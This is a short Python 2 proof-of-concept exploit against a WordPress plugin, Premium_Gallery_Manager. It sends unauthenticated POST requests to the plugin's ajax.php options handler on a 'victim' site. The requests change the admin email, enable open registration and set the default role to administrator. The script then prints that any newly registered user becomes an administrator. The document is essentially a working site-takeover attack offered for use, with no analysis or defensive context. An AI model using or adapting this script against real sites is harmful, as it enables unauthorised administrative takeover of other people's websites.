#POC :
Save File As Python (.py) =
import httplib, urllib
 
#target site
site = "victim" #<--- no http:// or https://
#path to ajax.php
url = "/wp-content/plugins/Premium_Gallery_Manager/hades_framework/option_panel/ajax.php"
 
def ChangeOption(site, url, option_name, option_value):
    params = urllib.urlencode({'action': 'save', 'values[0][name]': option_name, 'values[0][value]': option_value})
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    conn = httplib.HTTPConnection(site)
    conn.request("POST", url, params, headers)
    response = conn.getresponse()
    print response.status, response.reason
    data = response.read()
    print data
    conn.close()
      
ChangeOption(site, url, "admin_email", "youremail@test.com")
ChangeOption(site, url, "users_can_register", "1")
ChangeOption(site, url, "default_role", "administrator")
print "Now register a new user, they are an administrator by default!"
